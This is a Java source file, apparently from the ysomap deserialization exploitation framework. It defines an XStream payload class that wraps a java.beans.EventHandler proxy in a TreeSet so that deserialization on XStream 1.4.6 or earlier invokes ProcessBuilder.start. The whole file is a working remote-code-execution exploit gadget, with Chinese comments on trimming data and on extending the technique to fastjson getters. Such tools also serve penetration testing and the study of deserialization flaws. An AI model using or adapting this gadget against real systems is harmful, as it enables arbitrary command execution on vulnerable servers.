package ysomap.payloads.xstream;

import ysomap.bullets.Bullet;
import ysomap.bullets.jdk.ProcessBuilderBullet;
import ysomap.common.annotation.*;
import ysomap.core.util.PayloadHelper;
import ysomap.core.util.ReflectionHelper;

/**
 * @author wh1t3P1g
 * @since 2020/4/16
 */
@Payloads
@SuppressWarnings({"rawtypes"})
@Targets({ Targets.XSTREAM })
@Authors({ Authors.WH1T3P1G })
@Dependencies({"<=com.thoughtworks.xstream:xstream:1.4.6"})
@Require(bullets = {"ProcessBuilderBullet","JdbcRowSetImplBullet"}, param = false)
public class EventHandler extends XStreamPayload<Object> {

    @Override
    public Bullet getDefaultBullet(Object... args) throws Exception {
        return ProcessBuilderBullet.newInstance(args);
    }

    @Override
    public Object pack(Object obj) throws Exception {
        String action = bullet.get("action");
        if(action == null){
            action = "start";
        }
        Object entry = java.beans.EventHandler.create(Comparable.class, obj, action);
        Object h = ReflectionHelper.getFieldValue(entry, "h");
        ReflectionHelper.setFieldValue(h, "acc", null);// 清除无用数据
        return PayloadHelper.makeTreeSet("foo", entry);
    }
    // 这里还可以扩展 fastjson 那种利用getters的方式
}
